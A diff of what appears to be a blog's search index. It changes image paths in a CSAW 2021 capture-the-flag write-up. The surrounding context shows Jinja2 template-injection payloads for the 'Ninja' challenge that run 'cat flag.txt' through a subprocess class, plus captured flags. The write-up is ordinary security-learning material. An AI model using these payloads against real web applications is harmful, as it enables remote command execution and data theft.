@@ -20112,7 +20112,7 @@ my <span class="token variable">$file</span><span class="token operator">=</span
   <entry>
     <title>CSAW2021</title>
     <url>/2021/10/30/csaw2021/</url>
-    <content><![CDATA[<p><img src="/CSAW2021.assets/image-20211030195537198.png" alt="image-20211030195537198"></p>
+    <content><![CDATA[<p><img src="/2021/10/30/csaw2021/1.png" alt="image-20211030195537198"></p>
 <h1 id="Ninja🥷"><a href="#Ninja🥷" class="headerlink" title="Ninja🥷"></a>Ninja🥷</h1><p>ssti-&gt;payload</p>
 <pre><code>{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5f'+'b'+'ase\x5f\x5f')|attr('x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(258)('cat flag.txt',shell=True,stdout=-1)|attr('communicate')()}}</code></pre>
 <pre><code>{{''[request.args.a][request.args.b][2][request.args.c]()[258]('cat+flag.txt',shell%3dTrue,stdout%3d-1).communicate()[0].strip()}}&amp;a=__class__&amp;b=__mro__&amp;c=__subclasses__</code></pre>
@@ -20131,7 +20131,7 @@ my <span class="token variable">$file</span><span class="token operator">=</span
 
     <span class="token keyword">print</span><span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
 <p>flag{gunicorn_probably_should_not_do_that}</p>
-<h1 id="No-pass-needed"><a href="#No-pass-needed" class="headerlink" title="No-pass-needed"></a>No-pass-needed</h1><p><img src="/CSAW2021.assets/image-20211031152446651.png" alt="image-20211031152446651"></p>
+<h1 id="No-pass-needed"><a href="#No-pass-needed" class="headerlink" title="No-pass-needed"></a>No-pass-needed</h1><p><img src="/2021/10/30/csaw2021/2.png" alt="image-20211031152446651"></p>
 <p>flag{wh0_n3ed5_a_p4ssw0rd_anyw4y}</p>
 ]]></content>
   </entry>
